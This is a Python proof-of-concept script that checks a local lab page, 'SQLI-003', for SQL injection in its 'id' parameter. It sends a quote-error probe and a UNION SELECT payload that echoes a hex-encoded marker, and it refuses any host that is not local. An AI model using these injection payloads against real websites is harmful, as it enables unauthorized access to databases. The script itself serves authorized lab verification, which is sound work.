#!/usr/bin/env python3
# SQLI-003 SQL injection HTTP verification draft (local authorized lab only).
# Manual adaptation: set --path to the deployed SQLI-003.php location.
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKERS = ('Your Login name:', 'Your Password:', 'Please input the ID', 'Fatal error', 'Warning:', 'Hint: Your Input')
LOCAL_HOSTS = ('127.0.0.1', 'localhost', '::1')


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def check_local(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ('http', 'https'):
        raise SystemExit('unsupported scheme: ' + str(parts.scheme))
    if parts.hostname not in LOCAL_HOSTS:
        raise SystemExit('refusing non-local host: ' + str(parts.hostname))


def read_cookie(path):
    if not path:
        return None
    with open(path, 'r', encoding='utf-8') as handle:
        return handle.read().strip()


def fetch(opener, base_url, path, name, value, cookie, timeout):
    query = urllib.parse.urlencode({name: value})
    url = base_url.rstrip('/') + path + ('&' if '?' in path else '?') + query
    check_local(url)
    req = urllib.request.Request(url, headers={'User-Agent': 'sqli-003-audit-draft'})
    if cookie:
        req.add_header('Cookie', cookie)
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read().decode('utf-8', 'replace')
            return {'status': resp.status, 'location': resp.headers.get('Location'), 'body': body}
    except urllib.error.HTTPError as exc:
        body = exc.read().decode('utf-8', 'replace')
        return {'status': exc.code, 'location': exc.headers.get('Location'), 'body': body}
    except urllib.error.URLError as exc:
        print('transport error: ' + str(exc.reason))
        return None


def report(name, resp, marker):
    if resp is None:
        print('[{}] transport failure (connection refused or timeout)'.format(name))
        return False
    body = resp['body']
    print('[{}] http={} redirect={} bytes={}'.format(name, resp['status'], resp['location'], len(body)))
    seen = [item for item in MARKERS if item in body]
    if seen:
        print('    markers: ' + ', '.join(seen))
    else:
        print('    markers: none')
    hit = marker in body
    print('    injected-marker {}: {}'.format(marker, 'PRESENT' if hit else 'absent'))
    return hit


def main():
    parser = argparse.ArgumentParser(description='SQLI-003 id parameter SQL injection draft')
    parser.add_argument('--base-url', default='http://127.0.0.1:8080')
    parser.add_argument('--path', required=True, help='deployed path of SQLI-003.php, for example /sqli/SQLI-003.php')
    parser.add_argument('--param', default='id', help='parameter name taken from code: id')
    parser.add_argument('--cookie-file', default=None, help='optional local file holding a Cookie header value')
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()
    cookie = read_cookie(args.cookie_file)
    opener = urllib.request.build_opener(NoRedirect)
    marker = 'SQLI003'
    cases = [
        ('baseline', '1'),
        ('quote-error', "1'"),
        ('union-marker', "-1' UNION SELECT 1,0x53514c49303033,3-- -"),
    ]
    hits = {}
    for name, value in cases:
        resp = fetch(opener, args.base_url, args.path, args.param, value, cookie, args.timeout)
        hits[name] = report(name, resp, marker)
    print('---')
    print('baseline output look normal: ' + str(not hits.get('baseline')))
    print('injected marker observed: ' + str(bool(hits.get('union-marker'))))
    if hits.get('union-marker') and not hits.get('baseline'):
        print('RESULT: marker constant echoed only with injected payload; review manually.')
        return 0
    print('RESULT: no clean differential; adjust column count, path or session and retry.')
    return 1


if __name__ == '__main__':
    sys.exit(main())
